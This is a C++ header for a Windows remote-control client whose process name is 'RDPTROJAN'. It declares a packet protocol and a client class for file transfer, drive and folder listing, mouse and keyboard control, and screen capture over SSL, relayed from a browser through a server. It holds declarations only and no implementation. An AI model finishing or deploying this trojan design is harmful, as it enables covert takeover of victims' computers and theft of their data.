#pragma once


// C++ functions
#include <atlimage.h>
#include <iostream>
#include <sstream>
#include <fstream>
#include <vector>
#include <map>
#include <unordered_map>
#include <locale>
#include <algorithm>
#include <exception>
#include <iomanip>
#include <cstdlib>
#include <cstring>
#include <cassert>
#include <vector>

#include <boost/bind.hpp>
#include <boost/asio.hpp>
#include <boost/asio/ssl.hpp>
#include <boost/filesystem.hpp>
#include <boost/filesystem/operations.hpp>
#include <boost/date_time/posix_time/posix_time.hpp>
#include <boost/thread.hpp>
#include <shlobj.h> 

#include <windows.h>
#include <stdio.h>

using boost::asio::deadline_timer;

#include "ScreenCapture.h"

#ifdef _DEBUG
#pragma comment (lib, "libeay32MTd.lib")				// for OpenSSL communication
#pragma comment (lib, "ssleay32MTd.lib")	
#else 
#pragma comment (lib, "libeay32MT.lib")		
#pragma comment (lib, "ssleay32MT.lib")		
#endif


#define FILED_DELIMETER			";"
#define HTTP_CRLF_MARK          "\r\n"
#define HTTP_HEADER_END         "\r\n\r\n"
#define PROCESS_NAME			L"RDPTROJAN"

#define SAFE_SOCKET_CLOSE(sock)	do { try { if (sock != INVALID_SOCKET) { shutdown(sock, SD_BOTH); closesocket(sock); sock = INVALID_SOCKET;} \
									 } catch (std::exception &e) { std::cerr << "Socket close exception:" << e.what()<< std::endl; } \
								} while(0)


#define SELF_LIVE_SEVR_PORT		54321
#define BUFFER_SIZE				16384	// 16KB

/***
browser -> BROWSER_PACKET -> server -> SERVICE_PACKET -> service
(PNG_SVR, DRV_LST, FLD_LST, FLD_CRT, FIL_GET, FIL_PUT, MUS_CTL, KBD_CTL, SCR_GET, SCR_OFF)
browser <- SERVICE_CONTENTS <- server <- SERVICE_PACKET <- service
(PNG_SVR, SVC_ADD, SVC_DEL, DRV_LIST, FLD_LST, FLD_CRT, FIL_GET, FIL_PUT, SCR_GET)
***/

#define PACKET_TYPE_PNG_SVR 0
#define PACKET_TYPE_SVC_ADD 1
#define PACKET_TYPE_SVC_DEL 2
#define PACKET_TYPE_DRV_LST 3
#define PACKET_TYPE_FLD_LST 4
#define PACKET_TYPE_FLD_CRT 5
#define PACKET_TYPE_FIL_GET 6
#define PACKET_TYPE_FIL_PUT 7
#define PACKET_TYPE_MUS_CTL 8
#define PACKET_TYPE_KBD_CTL 9
#define PACKET_TYPE_SCR_GET 10
#define PACKET_TYPE_SCR_OFF 11


#pragma pack(push, 1)

/// service respond packet
typedef struct _service_contents
{
	uint32_t            packet_size;   // data size
	uint16_t            packet_type;   // packet type
	//void*               packet_data; // data contents
}SERVICE_CONTENTS;

/// service packet data structure to be sent
typedef struct _service_request
{
	uint32_t            browser_sock;  // browser socket
	SERVICE_CONTENTS    service_data;  // service contents
}SERVICE_PACKET;

/// browser packet data structure
typedef struct _browser_packet
{
	uint32_t            service_sock;  // target socket
	SERVICE_PACKET      service_request;
}BROWSER_PACKET;

struct CommandDS
{
	char	szElement[81];
};

// The Command Stack Linked List
struct CommandList
{
	struct	CommandDS	Command;
	struct	CommandList	*pNext;
};



typedef struct _BrowserInfo {
	uint32_t browser_sock;
} BrowserInfo;

#pragma pack(pop)

#define BROWSER_PACKET_OVERHEAD    sizeof(BROWSER_PACKET)
#define SERVICE_PACKET_OVERHEAD    sizeof(SERVICE_PACKET)
#define SERVICE_CONTENTS_OVERHEAD  sizeof(SERVICE_CONTENTS)
#define SERVICE_PACKET_MAX_DATA	   (BUFFER_SIZE - SERVICE_CONTENTS_OVERHEAD - MAX_PATH)

class ServiceClient
{
public:

	ServiceClient(boost::asio::io_service& io_service, boost::asio::ssl::context& context, boost::asio::ip::tcp::resolver::iterator endpoint_iterator);


	void handle_connect(const boost::system::error_code& error);
	void handle_handshake(const boost::system::error_code& error);
	void handle_write(const boost::system::error_code& error, size_t bytes_transferred);
	void handle_read(const boost::system::error_code& error, size_t bytes_transferred);
	void handle_scr_send(const boost::system::error_code& error);
	void handle_ping_timer();
	void start_read();
	void start_write();
	void await_output();
	void deliver(const std::string& msg);
	bool stopped() const;
	void stop();
	// Function Prototypes
	
protected:
	void ProcessPacket(SERVICE_PACKET * requests); // 

private:

	void handle_request(uint32_t browser_sock, uint16_t type, const char* raw_data, size_t raw_size);
	std::string get_drive_list();
	std::string get_folder_list(std::string path);
	std::string get_current_timestamp();

private:
	boost::asio::ssl::stream<boost::asio::ip::tcp::socket> m_socket;
	boost::asio::deadline_timer m_ping_timer;
	boost::posix_time::seconds m_interval;			// 1 second			
	char m_read_buff[BUFFER_SIZE];
	char m_ping_buff[SERVICE_PACKET_OVERHEAD];

	std::deque<std::string> m_output_queue_;
	deadline_timer m_non_empty_output_queue_;
	deadline_timer m_screen_send_timer;
	std::vector<char>		m_recv_buffer;

public:

	void	DispatchWMMessage(char *szString);
	struct	CommandList* Add_Command(struct CommandList* pNode, struct CommandDS Command);
	void Clear_Command(struct CommandList* pStart);

	BrowserInfo			m_browserInfo;
	ScreenCapture		m_screen_capture;
};
